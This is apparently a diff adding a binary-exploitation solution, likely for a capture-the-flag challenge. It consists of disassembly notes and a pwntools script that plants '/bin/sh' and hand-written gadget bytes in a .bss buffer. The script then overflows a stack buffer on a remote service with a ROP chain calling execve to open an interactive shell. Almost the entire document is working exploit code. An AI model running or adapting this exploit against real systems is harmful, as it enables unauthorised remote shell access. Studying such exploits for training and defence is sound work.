@@ -1,0 +1,57 @@
+0x0015902b /bin/sh
+0x0003A940
+
+.bss:0804A060 pop     eax
+.bss:0804A061 retn
+.bss:0804A062 ; ---------------------------------------------------------------------------
+.bss:0804A062 pop     edx
+.bss:0804A063 pop     ecx
+.bss:0804A064 pop     ebx
+.bss:0804A065 retn
+.bss:0804A066 ; ---------------------------------------------------------------------------
+.bss:0804A066 int     80h                             ; LINUX -
+.bss:0804A066 ; ---------------------------------------------------------------------------
+.bss:0804A068 db    0
+
+.bss:0804A060 name [50]
+
+/bin/sh		// 0x0804A060
+
+\x58		// pop eax  0x0804A068
+\xc3		// ret
+
+
+\x5a		// pop edx  0x0804A06A
+\x59		// pop ecx  
+\x5b		// pop ebx  
+\xc3		// ret
+
+\xcd\x80	// int 80h  0x0804A06E
+
+
+----------------------------------------------------------
+
+from pwn import *
+name='/bin/sh\0\x58\xc3\x5a\x59\x5b\xc3\xcd\x80'+'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'
+auth='<deleted>'
+
+
+sh=remote("10.214.10.18",11782)
+
+sh.recvrepeat(timeout = 1)
+sh.sendline(auth)
+
+sh.recvrepeat(timeout = 1)
+sh.sendline(name)
+sh.recvrepeat(timeout = 1)
+
+pop_eax_ret = 0x0804A068
+pop_edx_ecx_ebx_ret = 0x0804A06A
+int_0x80 = 0x0804A06E
+binsh = 0x0804A060
+
+payload = flat(['A' * (0x4+0x14+8), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+
+sh.sendline(payload)
+
+sh.interactive()
